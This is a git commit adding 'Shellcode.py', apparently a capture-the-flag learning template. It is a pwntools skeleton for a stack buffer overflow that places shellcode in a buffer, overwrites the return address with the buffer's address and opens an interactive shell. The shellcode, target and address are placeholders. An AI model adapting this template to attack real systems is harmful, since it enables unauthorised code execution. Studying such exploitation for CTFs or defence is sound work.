dc93c168697c36ad91535e0ce63fe6378d93f887
Chaitanya Krishna Chauhan <95117634+ckc9759@users.noreply.github.com>
2025-03-20 17:51:14 +0530

    Create Shellcode.py

---
+++ PWN/PWN_2.0/Shellcode.py
@@ -0,0 +1,24 @@
+# ldd <filename>
+# ASLR -> randomizes addresses of memory segments i.e. heap and stack -> making difficult of vuln inorder to execute shellcode
+
+# read -> read bytes irrespective of format specifier
+
+# shellcode -> arbitrary code execution
+
+from pwn import *
+
+context.binary = binary = "./filename"
+
+shellcode="\x48\x...."
+
+p = process
+p = remote('host',port)
+
+output = p.recv()
+
+buff_adr = <strip from input>
+
+payload = shellcode + b"A"*(0x50-len(shellcode)) + b"B" * 0x8 + p64(buff_adr)
+
+p.sendline(payload)
+p.interactive()
